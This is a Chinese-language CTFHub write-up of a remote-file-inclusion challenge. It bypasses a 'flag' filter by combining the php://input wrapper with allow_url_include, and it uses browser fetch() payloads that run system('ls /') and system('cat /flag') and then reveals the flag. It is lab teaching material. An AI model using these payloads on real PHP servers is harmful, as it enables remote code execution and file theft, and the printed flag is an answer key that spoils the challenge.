---
title: CTFHub-RCE-远程包含 Writeup
date: 2026-10-24
category: web
tags: [CTFHub, RCE, 文件包含, 伪协议]
---

## 漏洞分析

### 1. 源码审计

访问靶机首页，页面给出源码
限制条件：使用 strpos() 检查 file 参数是否包含 flag，如果包含则拦截。
提示信息：页面提示没有 shell，并提供了一个 phpinfo.php 链接。

### 2. 环境探测

访问 phpinfo.php，搜索 allow_url_include，确认其状态为 On。
这意味着我们可以使用 php://input 伪协议，将 POST 请求体中的内容当作 PHP 代码执行。因为过滤只针对 file 参数，我们将执行命令放在 POST 请求体中即可绕过。

## 解题步骤

### 第一步：构造伪协议包含并探测目录

由于需要在同一请求中发送 GET 参数和 POST 数据，使用浏览器开发者工具（Console）发送 POST 请求：

fetch('?file=php://input', {
    method: 'POST',
    body: '<?php system("ls /");?>'
})
.then(response => response.text())
.then(text => console.log(text));
查看控制台回显，发现根目录下存在 flag 文件。

### 第二步：读取 Flag

将 POST 请求体中的命令修改为读取 flag 文件：

fetch('?file=php://input', {
    method: 'POST',
    body: '<?php system("cat /flag");?>'
})
.then(response => response.text())
.then(text => console.log(text));

### 在控制台回显中成功获取到 Flag：ctfhub{edfbc981b030bdad48f496db}。
